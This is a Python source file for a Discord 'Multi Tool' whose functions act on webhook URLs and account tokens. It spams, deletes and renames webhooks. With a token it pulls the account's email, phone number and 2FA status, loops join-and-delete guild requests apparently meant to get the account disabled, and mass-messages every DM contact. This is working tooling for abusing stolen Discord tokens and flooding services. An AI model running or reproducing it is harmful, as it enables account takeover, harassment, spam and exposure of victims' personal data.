import colorama, os, ctypes, requests, string, random, json
from colorama import Fore, init
from discord.webhook import Webhook
from time import sleep
from selenium import webdriver
from dhooks import Webhook
init(autoreset=True)
ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
width = os.get_terminal_size().columns
w = Fore.WHITE


with open('theme.json') as f:
    t__ = json.load(f)
theme = t__.get('theme')
if theme == "blue":
    c = Fore.CYAN
elif theme == "red":
    c = Fore.RED
elif theme == "purple":
    c = Fore.MAGENTA
elif theme == "green":
    c = Fore.LIGHTGREEN_EX
else:
    os.system("cls")
    print(f"{w}Invalid {Fore.RED}theme.json{w}: {Fore.RED}{theme}\n{w}Please change to one of these:\n{Fore.CYAN}blue\n{Fore.RED}red\n{Fore.MAGENTA}purple\n{Fore.LIGHTGREEN_EX}green")
    e=input(f"press enter...")
    os._exit(os.X_OK)


def cls():
    os.system("cls")
cls()

def menu():
    if theme == "blue":
        print(Fore.CYAN+"")
        print(f"""                     {Fore.WHITE}███{Fore.LIGHTCYAN_EX}╗   {Fore.WHITE}███{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗   {Fore.WHITE}██{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗  {Fore.WHITE}████████{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗    {Fore.WHITE}████████{Fore.LIGHTBLUE_EX}╗ {Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╗  {Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╗ {Fore.WHITE}██{Fore.BLUE}╗               
                     {Fore.WHITE}████{Fore.LIGHTCYAN_EX}╗ {Fore.WHITE}████{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║  ╚══{Fore.WHITE}██{Fore.CYAN}╔══╝{Fore.WHITE}██{Fore.CYAN}║    {Fore.LIGHTBLUE_EX}╚══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔══╝{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔═══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╗{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔═══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╗{Fore.WHITE}██{Fore.BLUE}║
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}╔{Fore.WHITE}████{Fore.LIGHTCYAN_EX}╔{Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║     {Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.BLUE}║     
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}║╚{Fore.WHITE}██{Fore.LIGHTCYAN_EX}╔╝{Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║     {Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.BLUE}║     
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}║ ╚═╝ {Fore.WHITE}██{Fore.CYAN}║╚{Fore.WHITE}██████{Fore.CYAN}╔╝{Fore.WHITE}███████{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   ╚{Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╔╝╚{Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╔╝{Fore.WHITE}███████{Fore.BLUE}╗
                     {Fore.LIGHTCYAN_EX}╚═╝     ╚{Fore.CYAN}═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       {Fore.LIGHTBLUE_EX}╚═╝    ╚═════╝  ╚═════╝ ╚{Fore.BLUE}══════╝""")
        print(f"{Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.LIGHTBLUE_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    elif theme == "red":
        print(Fore.RED+"")
        print(f"""                     {Fore.WHITE}███{Fore.LIGHTRED_EX}╗   {Fore.WHITE}███{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗  {Fore.WHITE}████████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗    {Fore.WHITE}████████{Fore.LIGHTRED_EX}╗ {Fore.WHITE}██████{Fore.LIGHTRED_EX}╗  {Fore.WHITE}██████{Fore.LIGHTRED_EX}╗ {Fore.WHITE}██{Fore.RED}╗               
                     {Fore.WHITE}████{Fore.LIGHTRED_EX}╗ {Fore.WHITE}████{Fore.RED}║{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║  ╚══{Fore.WHITE}██{Fore.RED}╔══╝{Fore.WHITE}██{Fore.RED}║    {Fore.LIGHTRED_EX}╚══{Fore.WHITE}██{Fore.LIGHTRED_EX}╔══╝{Fore.WHITE}██{Fore.LIGHTRED_EX}╔═══{Fore.WHITE}██{Fore.LIGHTRED_EX}╗{Fore.WHITE}██{Fore.LIGHTRED_EX}╔═══{Fore.WHITE}██{Fore.LIGHTRED_EX}╗{Fore.WHITE}██{Fore.RED}║
                     {Fore.WHITE}██{Fore.LIGHTRED_EX}╔{Fore.WHITE}████{Fore.LIGHTRED_EX}╔{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║     {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║       {Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║{Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║{Fore.WHITE}██{Fore.RED}║     
                     {Fore.WHITE}██{Fore.LIGHTRED_EX}║╚{Fore.WHITE}██{Fore.LIGHTRED_EX}╔╝{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║     {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║       {Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║{Fore.WHITE}██{Fore.LIGHTRED_EX}║   {Fore.WHITE}██{Fore.LIGHTRED_EX}║{Fore.WHITE}██{Fore.RED}║     
                     {Fore.WHITE}██{Fore.LIGHTRED_EX}║ ╚═╝ {Fore.WHITE}██{Fore.RED}║╚{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║       {Fore.WHITE}██{Fore.LIGHTRED_EX}║   ╚{Fore.WHITE}██████{Fore.LIGHTRED_EX}╔╝╚{Fore.WHITE}██████{Fore.LIGHTRED_EX}╔╝{Fore.WHITE}███████{Fore.RED}╗
                     {Fore.LIGHTRED_EX}╚═╝     ╚{Fore.RED}═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       {Fore.LIGHTRED_EX}╚═╝    ╚═════╝  ╚═════╝ ╚{Fore.RED}══════╝""")
        print(f"{Fore.LIGHTRED_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.LIGHTRED_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    elif theme == "purple":
        print(Fore.MAGENTA+"")
        print(f"""                     {Fore.WHITE}███{Fore.LIGHTMAGENTA_EX}╗   {Fore.WHITE}███{Fore.MAGENTA}╗{Fore.WHITE}██{Fore.MAGENTA}╗   {Fore.WHITE}██{Fore.MAGENTA}╗{Fore.WHITE}██{Fore.MAGENTA}╗  {Fore.WHITE}████████{Fore.MAGENTA}╗{Fore.WHITE}██{Fore.MAGENTA}╗    {Fore.WHITE}████████{Fore.LIGHTMAGENTA_EX}╗ {Fore.WHITE}██████{Fore.LIGHTMAGENTA_EX}╗  {Fore.WHITE}██████{Fore.LIGHTMAGENTA_EX}╗ {Fore.WHITE}██{Fore.MAGENTA}╗               
                     {Fore.WHITE}████{Fore.LIGHTMAGENTA_EX}╗ {Fore.WHITE}████{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║  ╚══{Fore.WHITE}██{Fore.MAGENTA}╔══╝{Fore.WHITE}██{Fore.MAGENTA}║    {Fore.LIGHTMAGENTA_EX}╚══{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╔══╝{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╔═══{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╗{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╔═══{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╗{Fore.WHITE}██{Fore.MAGENTA}║
                     {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╔{Fore.WHITE}████{Fore.LIGHTMAGENTA_EX}╔{Fore.WHITE}██{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║     {Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║       {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║{Fore.WHITE}██{Fore.MAGENTA}║     
                     {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║╚{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}╔╝{Fore.WHITE}██{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║{Fore.WHITE}██{Fore.MAGENTA}║     {Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║       {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║{Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║{Fore.WHITE}██{Fore.MAGENTA}║     
                     {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║ ╚═╝ {Fore.WHITE}██{Fore.MAGENTA}║╚{Fore.WHITE}██████{Fore.MAGENTA}╔╝{Fore.WHITE}███████{Fore.MAGENTA}╗{Fore.WHITE}██{Fore.MAGENTA}║   {Fore.WHITE}██{Fore.MAGENTA}║       {Fore.WHITE}██{Fore.LIGHTMAGENTA_EX}║   ╚{Fore.WHITE}██████{Fore.LIGHTMAGENTA_EX}╔╝╚{Fore.WHITE}██████{Fore.LIGHTMAGENTA_EX}╔╝{Fore.WHITE}███████{Fore.MAGENTA}╗
                     {Fore.LIGHTMAGENTA_EX}╚═╝     ╚{Fore.MAGENTA}═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       {Fore.LIGHTMAGENTA_EX}╚═╝    ╚═════╝  ╚═════╝ ╚{Fore.MAGENTA}══════╝""")
        print(f"{Fore.LIGHTMAGENTA_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.LIGHTMAGENTA_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    elif theme == "green":
        print(Fore.GREEN+"")
        print(f"""                     {Fore.WHITE}███{Fore.LIGHTGREEN_EX}╗   {Fore.WHITE}███{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╗   {Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╗  {Fore.WHITE}████████{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╗    {Fore.WHITE}████████{Fore.LIGHTGREEN_EX}╗ {Fore.WHITE}██████{Fore.LIGHTGREEN_EX}╗  {Fore.WHITE}██████{Fore.LIGHTGREEN_EX}╗ {Fore.WHITE}██{Fore.GREEN}╗               
                     {Fore.WHITE}████{Fore.LIGHTGREEN_EX}╗ {Fore.WHITE}████{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║  ╚══{Fore.WHITE}██{Fore.GREEN}╔══╝{Fore.WHITE}██{Fore.GREEN}║    {Fore.LIGHTGREEN_EX}╚══{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╔══╝{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╔═══{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╗{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╔═══{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╗{Fore.WHITE}██{Fore.GREEN}║
                     {Fore.WHITE}██{Fore.LIGHTGREEN_EX}╔{Fore.WHITE}████{Fore.LIGHTGREEN_EX}╔{Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║       {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║{Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║{Fore.WHITE}██{Fore.GREEN}║     
                     {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║╚{Fore.WHITE}██{Fore.LIGHTGREEN_EX}╔╝{Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║       {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║{Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║{Fore.WHITE}██{Fore.GREEN}║     
                     {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║ ╚═╝ {Fore.WHITE}██{Fore.GREEN}║╚{Fore.WHITE}██████{Fore.GREEN}╔╝{Fore.WHITE}███████{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}║   {Fore.WHITE}██{Fore.GREEN}║       {Fore.WHITE}██{Fore.LIGHTGREEN_EX}║   ╚{Fore.WHITE}██████{Fore.LIGHTGREEN_EX}╔╝╚{Fore.WHITE}██████{Fore.LIGHTGREEN_EX}╔╝{Fore.WHITE}███████{Fore.GREEN}╗
                     {Fore.LIGHTGREEN_EX}╚═╝     ╚{Fore.GREEN}═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       {Fore.LIGHTGREEN_EX}╚═╝    ╚═════╝  ╚═════╝ ╚{Fore.GREEN}══════╝""")
        print(f"{Fore.LIGHTGREEN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.LIGHTGREEN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def webhook_delete():
    ctypes.windll.kernel32.SetConsoleTitleW("Delete webhook | Lodi#0001")
    webhook = input(f"{c}[{w}Delete webhook{c}] {w}| {c}Enter webhook{w}: ")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Delete webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Delete webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Delete webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        requests.delete(webhook)
        sleep(.5)
        print(f"{c}[{w}Delete webhook{c}] {w}| {c}Webhook deleted{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Delete webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        cls()
        menu()
        print(f"{c}[{w}Delete webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Delete webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

        
def webhook_spammer():
    ctypes.windll.kernel32.SetConsoleTitleW("Spam webhook | Lodi#0001")
    webhook=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Enter webhook{w}: ")
    message=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Enter message{w}: ")
    amount=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Amount of requests{w}: ")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Spam webhook | 0/{amount} | Lodi#0001")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Spam webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        req_count = 0
        cls()
        menu()
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        sleep(.7)
        print(f"{c}[{w}Spam webhook{c}] {w}| {c}Sending {w}{amount} {c}requests with {w}{message}{c}.")
        for x in range(int(amount)):
            spam=requests.post(webhook, json = {"content" : message}, params = {'wait' : True})
            req_count += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Spam webhook | {req_count}/{amount} | Lodi#0001")
            if spam.status_code == 429:
                print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.RED}Rate limited {c}[{w}{spam.json()['retry_after']}ms{c}]")
                sleep(spam.json()["retry_after"] / 1000)
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Finished{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Spam webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        cls()
        menu()
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Spam webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def webhook_info():
    ctypes.windll.kernel32.SetConsoleTitleW("Webhook info | Lodi#0001")
    webhook=input(f"{c}[{w}Webhook info{c}] {w}| {c}Enter webhook{w}: ")
    hook = Webhook(f"{webhook}")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Webhook info{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Webhook info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Webhook info{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        hook.get_info()
        sleep(.1)
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Guild ID: {w}{hook.guild_id}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Channel ID: {w}{hook.channel_id}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Name: {w}{hook.default_name}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Avatar: {w}{hook.default_avatar_url}")
        sleep(.3)
        exit=input(f"{c}[{w}Webhook info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        cls()
        menu()
        print(f"{c}[{w}Webhook info{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Webhook info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def webhook_modify():
    ctypes.windll.kernel32.SetConsoleTitleW("Modify webhook | Lodi#0001")
    webhook=input(f"{c}[{w}Modify webhook{c}] {w}| {c}Enter webhook{w}: ")
    webhook_name=input(f"{c}[{w}Modify webhook{c}] {w}| {c}Enter webhook name{w}: ")
    hook = Webhook(f"{webhook}")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Modify webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Modify webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Modify webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        hook.modify(name=webhook_name)
        sleep(.3)
        print(f"{c}[{w}Modify webhook{c}] {w}| {c}Successfully changed webhook name to {w}{webhook_name}{c}.")
        sleep(.3)
        exit=input(f"{c}[{w}Modify webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        cls()
        menu()
        print(f"{c}[{w}Modify webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Modify webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def token_info():
    ctypes.windll.kernel32.SetConsoleTitleW("Token info | Lodi#0001")
    token=input(f"{c}[{w}Token info{c}] {w}| {c}Enter token{w}: ")
    cls()
    menu()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

    if tkn.status_code == 200:
        print(f"{c}[{w}Token info{c}] {w}| {Fore.LIGHTGREEN_EX}Valid token{w}.")
        tkn_json = tkn.json()
        user_name = f'{tkn_json["username"]}#{tkn_json["discriminator"]}'
        user_id = tkn_json['id']
        avatar_id = tkn_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = tkn_json['phone']
        email = tkn_json['email']
        mfa_enabled = tkn_json['mfa_enabled']
        sleep(.1)
        print(f"""{c}[{w}Token info{c}] {w}| {c}User ID: {w}{user_id}
{c}[{w}Token info{c}] {w}| {c}Username: {w}{user_name}
{c}[{w}Token info{c}] {w}| {c}2fa: {w}{mfa_enabled}
{c}[{w}Token info{c}] {w}| {c}Avatar: {w}{avatar_url}
{c}[{w}Token info{c}] {w}| {c}Email: {w}{email}
{f"{c}[{w}Token info{c}] {w}| {c}Phone number: {w}{phone_number}" if phone_number else f"{c}[{w}Token info{c}] {w}| {Fore.RED}No phone number{w}."}""")
        sleep(.3)
        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif tkn.status_code == 401:
        print(f"{c}[{w}Token info{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        print(f"{c}[{w}Token info{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def token_disabler():
    ctypes.windll.kernel32.SetConsoleTitleW("Disable token | Lodi#0001")
    token=input(f"{c}[{w}Disable token{c}] {w}| {c}Enter token{w}: ")
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if tkn.status_code == 200:
        print(f"{c}[{w}Disable token{c}] {w}| {Fore.LIGHTGREEN_EX}Valid token{w}.")
        tkn_json = tkn.json()
        cls()
        menu()
        print(f"{c}[{w}Disable token{c}] {w}| {c}Account disabled: {Fore.RED}False")
        for i in range(50):
            api = requests.get("https://discordapp.com/api/v6/invite/PGRqctPYHX")
            data = api.json()
            check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
            stuff = check.json()
            requests.post("https://discordapp.com/api/v6/invite/PGRqctPYHX", headers={"Authorization": token})
            requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    elif tkn.status_code == 401:
        print(f"{c}[{w}Disable token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Disable token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        print(f"{c}[{w}Disable token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Disable token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def nuke_token():
    ctypes.windll.kernel32.SetConsoleTitleW("Nuke token | Lodi#0001")
    Token=input(f"{c}[{w}Nuke token{c}] {w}| {c}Enter token{w}: ")
    headers = {
        'Authorization': Token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if tkn.status_code == 200:
        print(f"{c}[{w}Nuke token{c}] {w}| {Fore.LIGHTGREEN_EX}Valid token{w}.")
        sleep(.3)
        mass_dm_message=input(f"{c}[{w}Nuke token{c}] {w}| {c}Enter message to dm everyone{w}: ")
        sleep(.3)
        server_name=input(f"{c}[{w}Nuke token{c}] {w}| {c}Enter server name{w}: ")
        print(f"{c}[{w}Nuke token{c}] {w}| Mass dming{c}...")
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        mass_dm_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
        ).json()
        for channel in mass_dm_request:
            json = {"content": mass_dm_message}
            r = requests.post(
                f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
                headers=headers,
                data=json,
            )
        print(f"{c}[{w}Nuke token{c}] {w}| Mass dming finished{c}.")
